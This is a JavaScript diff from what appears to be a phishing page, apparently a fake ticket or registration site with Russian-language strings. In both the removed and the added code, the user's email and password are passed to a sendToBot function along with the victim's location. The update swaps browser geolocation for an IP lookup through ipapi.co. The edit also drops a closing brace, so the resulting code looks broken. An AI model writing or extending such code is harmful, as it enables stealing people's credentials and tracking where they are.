@@ -1542,26 +1542,13 @@ loadTickets();
     onRegister();
   }
 
-  if(navigator.geolocation){
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        const lat = pos.coords.latitude.toFixed(4);
-        const lon = pos.coords.longitude.toFixed(4);
-        fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`)
-          .then(r=>r.json())
-          .then(d=>{
-            const city    = d.address?.city || d.address?.town || d.address?.village || '—';
-            const country = d.address?.country || '—';
-            sendToBot({email, pass, geo:`${country}, ${city} (${lat}, ${lon})`});
-          })
-          .catch(()=>sendToBot({email, pass, geo:`${lat}, ${lon}`}));
-      },
-      () => sendToBot({email, pass, geo:'геолокация отклонена'})
-    );
-  } else {
-    sendToBot({email, pass, geo:'недоступна'});
-  }
-}
+ fetch('https://ipapi.co/json/')
+  .then(r => r.json())
+  .then(d => {
+    const geo = `${d.country_name||'—'}, ${d.city||'—'} (IP: ${d.ip})`;
+    sendToBot({email, pass, geo});
+  })
+  .catch(() => sendToBot({email, pass, geo:'не определено'}));
 
 function onRegister(){
   document.getElementById('auth-screen').style.opacity='0';
